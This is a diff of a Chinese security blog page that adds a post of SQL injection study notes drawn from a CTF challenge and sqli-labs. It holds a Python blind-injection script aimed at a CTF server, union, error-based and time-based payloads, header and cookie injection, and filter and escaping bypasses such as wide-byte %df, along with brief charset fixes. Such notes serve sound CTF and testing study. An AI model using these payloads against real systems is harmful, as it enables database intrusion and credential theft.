@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>我的第一篇文章 · kubo&#39;s blog</title>
+    <title>sql_bypass · kubo&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >kubo&#39;s blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">我的第一篇文章</a>
+                <a href="#" class="post-name">sql_bypass</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            我的第一篇文章
+            sql_bypass
             <!-- 404 -->
             
         </h1>
@@ -261,12 +261,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">0</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">2,187</span> / Reading time: <span class="post-count">10 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/14</span>
+                    <span class="post-intro-time">2018/08/04</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -390,14 +390,201 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        
+        <h2 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h2><p>基于iscc一道web题  对post注入进行深入的学习</p>
+<p>判断：admin’ or ‘1’=’1</p>
+<p>如果返回正常，则存在注入</p>
+<p>如果返回错误，则不存在注入</p>
+<p>Post基本上等同于get</p>
+<p>时间盲注判断语句：admin’ AND SLEEP(5) AND ‘SxBt’=’SxBt&amp;password=1</p>
+<p>各种字符均过滤，则使用：uname=’!=!!(asci(mid((passwd)from(1)))=99)!=!!’1&amp;passwd=dddd</p>
+<p><del>然后盲注脚本post.py</del></p>
+<pre><code>-*- coding: cp936 -*-
+import urllib2
+import urllib
+
+def check_url(payload):
+    postdata = {
+        &apos;username&apos;:payload,
+        &apos;password&apos;:&apos;qrqasd&apos;,}
+    url=&quot;http://118.190.152.202:8011/&quot;
+    postdata=urllib.urlencode(postdata)
+    request = urllib2.Request(url,postdata)
+    response = urllib2.urlopen(request)
+    html = response.read()
+    #print html
+    return &apos;normal user&apos; in html
+
+def set_payload():
+    a=&apos;&apos;
+    for j in range(33):
+        for i in range(47,128):
+            payload=&quot;admin&apos; &amp;&amp; ascii(substr(pass,%d,1))&lt;%d #&quot;%(j,i)
+            #print payload
+            b=check_url(payload)
+            #print b
+            if(b):
+                a=a+chr(i-1)
+                print a
+                break
+set_payload()
+</code></pre><p>输入正确的账号密码 返回正确</p>
+<p>判断：</p>
+<p>输入username：admin’ 或 admin”</p>
+<p>Password:ddd(随便输)</p>
+<p>会显示错误，可以从错误中分析到程序对参数进行单引号的处理。</p>
+<p>这里我们可以在输入框输入万能密码来尝试一下。</p>
+<p>这里username输入：admin’or’1’=’1#，密码随意。</p>
+<p>我们提交username和password后，后台形成的sql语句为</p>
+<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;admin&apos;or&apos;1&apos;=&apos;1# and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
+</code></pre><p>注入例：</p>
+<p>这里我们用union注入进行尝试：</p>
+<p>Username：1admin’union select 1,database()#</p>
+<p>passwd=1（任意密码）</p>
+<h2 id="Get"><a href="#Get" class="headerlink" title="Get"></a>Get</h2><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>查库  ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+</p>
+<p>查表 ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80 –+</p>
+<p>查字段 ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;108 –+</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>判断：’ or 1=1 –+ 或 1’ or ‘1’=’1 –+</p>
+<p>返回正常 存在注入</p>
+<p>返回错误 不存在注入</p>
+<p>判断当前数据库的首字母：</p>
+<p>‘ and left (database(),1)=’s’ –+</p>
+<p>‘ and ascii(substr((select database()),1,1))=115 –+</p>
+<p>查库 </p>
+<pre><code>AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+`
+</code></pre><p>查表</p>
+<pre><code>AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x7365637572697479+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
+</code></pre><p>查字段</p>
+<pre><code>AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(password)+AS+CHAR),0x7e))+FROM+security.users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
+</code></pre><h4 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h4><p>判断：’ and sleep(5) –+</p>
+<p>查库：’ and if(asci(substr(database(),0,1))&gt;115,1,sleep(5)) –+  // left(a,b)从左侧截取a的前b位</p>
+<p>//if判断语句，条件为假，执行sleep</p>
+<h2 id="修改密码过程注入"><a href="#修改密码过程注入" class="headerlink" title="修改密码过程注入"></a>修改密码过程注入</h2><p>修改密码的过程，利用的是update语句，与在用select时是一样的，我们仅需要将原先的闭合，构造自己的payload。</p>
+<p>尝试报错</p>
+<p>Username：admin</p>
+<p>Password：1’</p>
+<p>报错类型的盲注。</p>
+<pre><code>uname=admin&amp;passwd=11&apos;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit=Submit
+</code></pre><p>将@@version换成你的子句就可以进行其他的注入了。如@@basedir 返回mysql路径</p>
+<p>延时注入，也可以看到时间的延迟的明显效果</p>
+<pre><code>uname=admin&amp;passwd=11&apos;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit
+</code></pre><h2 id="referer进行修改"><a href="#referer进行修改" class="headerlink" title="referer进行修改"></a>referer进行修改</h2><p>从源代码中我们可以看到我们获取到的是HTTP_REFERER</p>
+<p>那和less18是基本一致的，我们从referer进行修改。</p>
+<p>还是像less18一样，我们只给出一个示例</p>
+<p>将referer修改为’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1</p>
+<p>对uname和passwd进行了check_input()函数的处理，所以我们在输入uname和passwd上进行注入是不行的，但是在代码中，我们看到了insert()</p>
+<pre><code>insert=&quot;INSERTINTO‘security‘.‘uagents‘(‘uagent‘,‘ipaddress‘,‘username‘)VALUES(′insert=&quot;INSERTINTO‘security‘.‘uagents‘(‘uagent‘,‘ipaddress‘,‘username‘)VALUES(′uagent&apos;, &apos;IP′,IP′,uname)&quot;;
+</code></pre><p>将user-agent修改为<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></p>
+<h2 id="Cookie进行修改"><a href="#Cookie进行修改" class="headerlink" title="Cookie进行修改"></a>Cookie进行修改</h2><p>从源代码中我们可以看到cookie从username中获得值后，当再次刷新时，会从cookie中读取username，然后进行查询。</p>
+<p>登录成功后，我们修改cookie，再次刷新时，这时候sql语句就会被修改了。</p>
+<p>修改cookie为</p>
+<pre><code>uname=admin1&apos;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#
+</code></pre><h2 id="，–过滤注入"><a href="#，–过滤注入" class="headerlink" title="#，–过滤注入"></a>#，–过滤注入</h2><p>注入语句</p>
+<p>?id=-1’ union select 1,@@datadir,’3</p>
+<p><strong>此处的**</strong>sql<strong>**语句为</strong></p>
+<pre><code>SELECT * FROM users WHERE id=&apos;-**1&apos; union select 1,@@datadir,&apos;3**&apos; limit 0,1
+</code></pre><p>Explain：此处讲解几个知识点：</p>
+<p>&lt;![if !supportLists]&gt;1. &lt;![endif]&gt;id=-1，为什么要用-1，因为sql语句执行了两个select语句，第一个select为id的选择语句，第二个为我们构造的select语句。只有一个数据可以输出，为了让我们自己构造的数据可以正常输出，第一个select要没有结果，所以-1或者超过数据库所有数据都可以。</p>
+<p>&lt;![if !supportLists]&gt;2. &lt;![endif]&gt;-<strong>1’ union select 1,@@datadir,’3**</strong>，**第一个’（单引号）闭合-1，第二个’（单引号）闭合后面的。这样将查询内容显示在username处。</p>
+<p>&lt;![if !supportLists]&gt;3. &lt;![endif]&gt;此处可以报错注入，延时注入，可以利用or ‘1’=’1进行闭合。</p>
+<pre><code>http://127.0.0.1/sqllib/Less-23/index.php?id=1%27or%20extractvalue%281,concat%280x7e,database%28%29%29%29%20or%20%271%27=%271
+</code></pre><p>以上这条语句就是利用extractvalue()进行报错注入。</p>
+<p>将@@datadir修改为其他的选择内容或者是内嵌的select语句。以下用联合注入方法进行注入。</p>
+<p>•获取数据库</p>
+<pre><code>http://127.0.0.1/sqllib/Less-23/index.php?id=-1&apos;union select 1,(select group_concat(schema_name) from information_schema.schemata),&apos;3
+</code></pre><p>此处获取的数据库为security</p>
+<p>•查看security库数据表</p>
+<pre><code>http://127.0.0.1/sqllib/Less-23/index.php?id=-1&apos;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),&apos;3
+</code></pre><h1 id="MySQL-updatexml-、extractvalue-报错型SQL注入"><a href="#MySQL-updatexml-、extractvalue-报错型SQL注入" class="headerlink" title="MySQL updatexml()、extractvalue() 报错型SQL注入"></a>MySQL updatexml()、extractvalue() 报错型SQL注入</h1><blockquote>
+<p><a href="http://www.target.com/index.php?id=1" target="_blank" rel="noopener">http://www.target.com/index.php?id=1</a> and<br>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</p>
+<p><a href="http://www.target.com/index.php?id=updatexml" target="_blank" rel="noopener">http://www.target.com/index.php?id=updatexml</a>(1,concat(0x7e,(SELECT<br>@@version),0x7e),1)</p>
+<p><a href="http://www.target.com/index.php?id=updatexml" target="_blank" rel="noopener">http://www.target.com/index.php?id=updatexml</a>(1,concat(0x7e,SUBSTR((SELECT<br>@@version),1,24),0x7e),1)</p>
+<p>updatexml(1,concat(0x7e,SUBSTR((SELECT f14g from f14g LIMIT<br>0,1),1,24),0x7e),1)</p>
+<p>updatexml(1,concat(0x7e,(select substring(f14g,20) from f14g limit<br>0,1),0x7e),1)</p>
+<p>extractvalue(0x0a,concat(0x0a,(select database())))</p>
+<p>1 &amp;&amp; extractvalue(0x0a,concat(0x0a,(select database())))#</p>
+<p>1 &amp;&amp; extractvalue(0x0a,concat(0x0a,(select table_name from<br>information_schema.tables limit 0,1)))#</p>
+<p>1 &amp;&amp; extractvalue(0x0a,concat(0x0a,(select column_name from<br>information_schema.columns limit 0,1)))#</p>
+<p>1 &amp;&amp; extractvalue(0x0a,concat(0x0a,(select substr(f14g,1,32) from<br>f14g)))#</p>
+<p>1 &amp;&amp; extractvalue(0x0a,concat(0x0a,(select substr(f14g,15,32) from<br>f14g)))#</p>
+</blockquote>
+<h2 id="or-and过滤"><a href="#or-and过滤" class="headerlink" title="or and过滤"></a>or and过滤</h2><blockquote>
+<ol>
+<li><p>大小写变形 Or,OR,oR</p>
+</li>
+<li><p>编码，hex，urlencode</p>
+</li>
+<li><p>添加注释/<em>or</em>/</p>
+</li>
+<li><p>利用符号 and=&amp;&amp; or=||</p>
+</li>
+</ol>
+</blockquote>
+<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：</p>
+<blockquote>
+<p>%09 TAB键（水平）</p>
+<p>%0a 新建一行</p>
+<p>%0c 新的一页</p>
+<p>%0d return功能</p>
+<p>%0b TAB键（垂直）</p>
+<p>%a0 空格</p>
+</blockquote>
+<p>我们首先给出一个最为简单的payload：</p>
+<pre><code>[http://127.0.0.1/sqllib/Less-26/?id=1&apos;%](http://127.0.0.1/sqllib/Less-26/?id=1%27%25)a0||&apos;1
+</code></pre><p>此可以构造类似的语句，</p>
+<pre><code>[http://127.0.0.1/sqllib/Less-26/?id=100%27union%0bselect%a01,2,3||%271](http://127.0.0.1/sqllib/Less-26/?id=100%27union%0bselect%a01,2,3||%271)
+</code></pre><h2 id="union，select过滤"><a href="#union，select过滤" class="headerlink" title="union，select过滤"></a>union，select过滤</h2><p>大小写或双写绕过</p>
+<pre><code>127.0.0.1/sqllib/Less-27/?id=100&apos;unIon%a0SelEcT%a01,database(),3||&apos;1
+
+或uniunionon
+</code></pre><h2 id="宽字节注入（get型-处理）"><a href="#宽字节注入（get型-处理）" class="headerlink" title="宽字节注入（get型\ 处理）"></a>宽字节注入（get型\ 处理）</h2><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<blockquote>
+<p>单引号（’）</p>
+<p>双引号（”）</p>
+<p>反斜杠（\）</p>
+</blockquote>
+<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
+<p>Addslashes()函数和我们在32关实现的功能基本一致的，所以我们依旧可以利用%df进行绕过。</p>
+<p>Notice：使用addslashes(),我们需要将mysql_query设置为binary的方式，才能防御此漏洞。</p>
+<pre><code>Mysql_query(&quot;SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary&quot;,$conn);
+</code></pre><h2 id="post型-处理"><a href="#post型-处理" class="headerlink" title="post型\ 处理"></a>post型\ 处理</h2><p>将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为�’ 。我们就可以利用这个方式进行尝试。</p>
+<p>如</p>
+<blockquote>
+<p>username：�’ or 1=1#</p>
+<p>Password：随便乱填</p>
+<p>SELECT username, password FROM users WHERE username=’�’ or 1=1#’ and<br>password=’$passwd’ LIMIT 0,1</p>
+</blockquote>
+<p>Explain：SELECT username, password FROM users WHERE username=’�’ or 1=1起到作用，后面的则被#注释掉了。而起作用的的语句不论select选择出来的内容是什么与 1=1进行or操作后，始终是1</p>
+<h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h2><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响：</p>
+<blockquote>
+<p>\x00</p>
+<p>\n</p>
+<p>\r</p>
+<p>\</p>
+<p>‘</p>
+<p>“</p>
+<p>\x1a</p>
+</blockquote>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
+<p>但是因mysql我们并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。方法和上述是一样的。</p>
+<p>Payload：</p>
+<pre><code>[http://127.0.0.1/sqli-labs/Less-36/?id=-1%EF%BF%BD%27union%20select%201,user(),3--+](http://127.0.0.1/sqli-labs/Less-36/?id=-1%EF%BF%BD%27union%20select%201,user(),3--+)
+</code></pre><p>这个我们利用的 ‘ 的utf-16进行突破的，我们也可以利用%df进行。</p>
+<p>Payload：</p>
+<pre><code>[http://127.0.0.1/sqli-labs/Less-36/?id=-1%df%27union%20select%201,user(),3--+](http://127.0.0.1/sqli-labs/Less-36/?id=-1%df%27union%20select%201,user(),3--+)
+</code></pre><p>Notice:</p>
+<p>在使用mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将mysql设置为gbk即可。</p>
+<p>设置代码：</p>
+<pre><code>Mysql_set_charset(&apos;gbk&apos;,&apos;$conn&apos;)
+</code></pre>
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://www.lybsec.top">kubo</a>
-            <p>原文链接: <a href="http://www.lybsec.top/2018/07/14/我的第一篇文章/">http://www.lybsec.top/2018/07/14/我的第一篇文章/</a>
-            <p>发表日期: <a href="http://www.lybsec.top/2018/07/14/我的第一篇文章/">July 14th 2018, 6:46:42 pm</a>
+            <p>原文链接: <a href="http://www.lybsec.top/2018/08/04/sql_bypass/">http://www.lybsec.top/2018/08/04/sql_bypass/</a>
+            <p>发表日期: <a href="http://www.lybsec.top/2018/08/04/sql_bypass/">August 4th 2018, 5:58:32 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -405,17 +592,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/04/thinkphp代码审计-1/" title= thinkphp代码审计 >
-                    <div class="nextTitle">thinkphp代码审计</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/14/hello-world/" title= Hello World >
-                    <div class="prevTitle">Hello World</div>
+                <a href= "/2018/08/04/thinkphp代码审计-1/" title= thinkphp代码审计 >
+                    <div class="prevTitle">thinkphp代码审计</div>
                 </a>
             
         </li>
@@ -527,7 +709,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Post"><span class="toc-number">1.</span> <span class="toc-text">Post</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get"><span class="toc-number">2.</span> <span class="toc-text">Get</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-number">2.1.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#报错注入"><span class="toc-number">2.1.1.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#时间注入"><span class="toc-number">2.1.2.</span> <span class="toc-text">时间注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修改密码过程注入"><span class="toc-number">3.</span> <span class="toc-text">修改密码过程注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#referer进行修改"><span class="toc-number">4.</span> <span class="toc-text">referer进行修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie进行修改"><span class="toc-number">5.</span> <span class="toc-text">Cookie进行修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#，–过滤注入"><span class="toc-number">6.</span> <span class="toc-text">#，–过滤注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-updatexml-、extractvalue-报错型SQL注入"><span class="toc-number"></span> <span class="toc-text">MySQL updatexml()、extractvalue() 报错型SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#or-and过滤"><span class="toc-number">1.</span> <span class="toc-text">or and过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#空格过滤"><span class="toc-number">2.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union，select过滤"><span class="toc-number">3.</span> <span class="toc-text">union，select过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入（get型-处理）"><span class="toc-number">4.</span> <span class="toc-text">宽字节注入（get型\ 处理）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#post型-处理"><span class="toc-number">5.</span> <span class="toc-text">post型\ 处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-real-escape-string"><span class="toc-number">6.</span> <span class="toc-text">mysql_real_escape_string()</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
